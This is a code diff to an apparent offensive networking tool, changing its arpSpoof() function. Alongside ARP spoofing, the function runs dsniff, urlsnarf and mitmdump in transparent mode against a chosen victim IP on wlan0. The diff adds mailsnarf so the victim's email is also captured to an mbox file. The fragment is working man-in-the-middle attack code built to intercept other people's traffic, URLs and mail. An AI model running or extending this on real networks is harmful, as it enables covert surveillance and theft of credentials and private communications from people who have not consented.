@@ -1836,12 +1836,16 @@ def arpSpoof():
     if(autoKillCommandNoKill(cmdDsniff,myTime)==-1):
         displayError()
         return()
-    cmdUrl = "urlsnarf -i wlan0 > Url"+str(victimIP)+".txt"
+    cmdUrl = "urlsnarf -i wlan0 > Url"+str(victimIP)+".clf"
     if(autoKillCommandNoKill(cmdUrl,myTime)==-1):
         displayError()
         return()
-    cmdMIMT = " mitmdump --mode transparent --showhost -w Mitm"+str(victimIP)+".txt"
+    cmdMIMT = " mitmdump --mode transparent --showhost -w Mitm"+str(victimIP)+".mitm"
     if(autoKillCommandNoKill(cmdMIMT,myTime)==-1):
+        displayError()
+        return()
+    cmdMail = "mailsnarf -i wlan0 > Mail"+str(victimIP)+".mbox"
+    if(autoKillCommandNoKill(cmdMail,myTime)==-1):
         displayError()
         return()
     time.sleep(10)
@@ -1856,6 +1860,7 @@ def arpSpoof():
     killCommand("dsniff")
     killCommand("urlsnarf")
     killCommand("mitm")
+    killCommand("mailsnarf")
     killCommand("arpspoof")
     killCommand("arpspoof")
     
